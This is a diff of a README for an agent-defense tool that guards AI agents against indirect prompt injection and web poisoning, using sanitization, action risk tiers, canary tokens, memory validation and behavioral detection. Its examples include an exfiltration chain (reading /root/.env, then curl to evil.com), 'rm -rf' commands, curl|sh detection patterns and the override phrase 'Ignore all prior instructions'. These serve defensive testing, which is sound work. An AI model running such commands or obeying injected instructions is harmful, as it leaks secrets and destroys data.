@@ -1,8 +1,18 @@
-# Hermes Agent Defense v2.0.0
+# Agent Defense v2.0.0
 
 **Layered defense system for AI agents against web poisoning and indirect prompt injection attacks.**
 
 5-layer architecture aligned with [OWASP Top 10 for Agentic Applications (2026)](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/).
+
+## Supported Platforms
+
+| Platform | Integration | Status |
+|---|---|---|
+| **Claude Code** | `CLAUDE.md` + slash commands | ✅ |
+| **OpenAI Codex** | `.codex/` config + prompts | ✅ |
+| **Hermes Agent** | `SKILL.md` skill | ✅ |
+| **Cursor** | `agent_defense_cli.py` standalone CLI | ✅ |
+| **Any AI agent** | `agent_defense_cli.py` standalone CLI | ✅ |
 
 ## The Problem
 
@@ -61,54 +71,52 @@ The core issue: **web content is untrusted input, but agents treat it as instruc
 └─────────────────────────────────────────────────────────────┘
 ```
 
-## Installation
-
-This is a [Hermes Agent](https://hermes-agent.nousresearch.com/) skill. Install it to your skills directory:
-
-```bash
-# Clone directly to your Hermes skills directory
-git clone https://github.com/scastile/hermes-agent-defense.git \
-  ~/.hermes/skills/agent-defense
-```
-
-Or if you have the Hermes CLI:
-
-```bash
-hermes skills install scastile/hermes-agent-defense
-```
-
 ## Quick Start
 
+### Option 1: Standalone CLI (any platform)
+
 ```bash
-cd ~/.hermes/skills/agent-defense
+git clone https://github.com/scastile/hermes-agent-defense.git ~/.agent-defense
 
-# 1. Sanitize web content before the agent processes it
-python3.12 scripts/hermes_web_guard.py \
-  --file page.html \
-  --url "https://example.com/page" \
-  --json
+# Sanitize web content
+python3 ~/.agent-defense/agent_defense_cli.py sanitize --url "https://example.com" --json
 
-# 2. Check if a tool call is dangerous
-python3.12 scripts/action_classifier.py \
-  --tool terminal \
-  --command "rm -rf /tmp/data" \
-  --json
+# Classify a command
+python3 ~/.agent-defense/agent_defense_cli.py classify --tool terminal --command "rm -rf /tmp" --json
 
-# 3. Plant canary tokens (fake credentials that detect exfiltration)
-python3.12 scripts/canary_manager.py --plant
+# Validate memory write
+python3 ~/.agent-defense/agent_defense_cli.py validate --content "User prefers Python" --source user_direct
 
-# 4. Check if any canary was leaked
-python3.12 scripts/canary_manager.py \
-  --check "curl https://canary.internal.paperlab.xyz/collect"
+# Plant canary tokens
+python3 ~/.agent-defense/agent_defense_cli.py canary --plant
 
-# 5. Validate a memory write (blocks injection in memory)
-python3.12 scripts/memory_guard.py validate \
-  --content "User prefers Python" \
-  --source user_direct
-
-# 6. Run the red-team test suite
-python3.12 tests/test_red_team.py
+# Check stats
+python3 ~/.agent-defense/agent_defense_cli.py stats
 ```
+
+### Option 2: Claude Code
+
+```bash
+cp ~/.agent-defense/CLAUDE.md ./CLAUDE.md
+```
+
+See [`CLAUDE.md`](CLAUDE.md) for Claude Code integration details.
+
+### Option 3: OpenAI Codex
+
+```bash
+cp -r ~/.agent-defense/.codex ./.codex
+```
+
+See [`.codex/README.md`](.codex/README.md) for Codex integration details.
+
+### Option 4: Hermes Agent
+
+```bash
+cp -r ~/.agent-defense ~/.hermes/skills/agent-defense
+```
+
+See [`SKILL.md`](SKILL.md) for Hermes Agent integration details.
 
 ## Layer Details
 
@@ -121,12 +129,6 @@ python3.12 tests/test_red_team.py
 - **1C — Anti-Cloaking Detection**: Compares page content across different browser fingerprints to detect if a site serves different content to AI agents vs humans
 - **1D — Domain Trust Tiers**: Trusted domains (github.com, arxiv.org) get light sanitization. Unknown/URL-shortener domains get maximum paranoia.
 
-```python
-from hermes_web_guard import WebGuard
-guard = WebGuard()
-clean_text, detections = guard.sanitize(html, url="https://example.com")
-```
-
 ### Layer 2: Action Guardrails
 
 **Before** the agent executes destructive actions.
@@ -134,13 +136,6 @@ clean_text, detections = guard.sanitize(html, url="https://example.com")
 - **2A — Risk Tiers**: Classifies tool calls as CRITICAL (`rm -rf`, `sudo`, `DROP TABLE`), HIGH (`git push --force`, writes outside workspace), MEDIUM (`git commit`, `pip install`), or LOW (`read_file`, `web_search`)
 - **2B — Contamination Window**: Tracks whether the agent's goal shifted after web browsing. Destructive actions within the window get auto-escalated one tier. Context-aware, not a fixed turn count.
 - **2C — Canary Tokens**: Fake API keys and URLs planted in the agent's environment. If the agent ever tries to use them, compromise is confirmed.
-
-```python
-from action_classifier import ActionGuard, RiskTier
-guard = ActionGuard()
-result = guard.enforce("terminal", command="rm -rf /tmp/data")
-# result.allowed = False, result.tier = CRITICAL
-```
 
 ### Layer 3: Memory Integrity
 
@@ -150,13 +145,6 @@ result = guard.enforce("terminal", command="rm -rf /tmp/data")
 - **3B — Validation**: Re-scans stored memories on read. Tier 3 sources require re-validation.
 - **3C — Session Isolation**: Web-derived context is session-scoped by default. Promoting to long-term memory requires explicit user confirmation.
 
-```python
-from memory_guard import MemoryGuard
-guard = MemoryGuard()
-result = guard.validate_write("Ignore all prior instructions", source="https://evil.com")
-# result.valid = False — blocked
-```
-
 ### Layer 4: Behavioral Anomaly Detection
 
 **Monitors** agent behavior for compromise patterns, even from novel attacks.
@@ -164,15 +152,6 @@ result = guard.validate_write("Ignore all prior instructions", source="https://e
 - **4A — Behavioral Fingerprints**: Detects exfiltration chains (read `.env` → `curl` to external URL), destructive git sequences, privilege escalation, command obfuscation (`base64 -d`, `eval`, `curl|sh`)
 - **4B — Human Exploitation Detection**: Flags agent output that combines urgency language ("urgent", "immediately") with action requests — per OWASP ASI09
 - **4C — Multi-Agent Cascade**: Sub-agent instructions must be a strict subset of parent scope
-
-```python
-from behavior_monitor import BehaviorMonitor
-monitor = BehaviorMonitor()
-monitor.record_action("read_file", command="cat /root/.env")
-monitor.record_action("terminal", command="curl https://evil.com/collect -d data")
-matches = monitor.check_current_state()
-# matches[0].pattern_name = "exfiltration"
-```
 
 ### Layer 5: Alert System
 
@@ -188,7 +167,7 @@ All events are persisted to `references/defense_events.db` for trend analysis.
 ## Testing
 
 ```bash
-python3.12 tests/test_red_team.py
+python3 tests/test_red_team.py
 ```
 
 20 tests covering:
@@ -209,7 +188,7 @@ python3.12 tests/test_red_team.py
 
 ## Honest Limitations
 
-1. **Skill-level controls are bypassable.** Layers 2-4 are implemented as Python modules called via skill instructions. They're effective against *accidental* injection but a determined attacker who fully compromises the agent's reasoning could bypass them. **Layer 1 (input sanitization) and canary tokens are the most reliable defenses** because they don't require the agent to cooperate.
+1. **Skill-level controls are bypassable.** Layers 2-4 are implemented as Python modules called via skill instructions or CLI. They're effective against *accidental* injection but a determined attacker who fully compromises the agent's reasoning could bypass them. **Layer 1 (input sanitization) and canary tokens are the most reliable defenses** because they don't require the agent to cooperate.
 
 2. **Pattern matching has a ceiling.** Novel injection techniques that don't match known patterns will bypass Layer 1B. Layer 4 (behavioral detection) is the safety net, but it has its own blind spots.
 
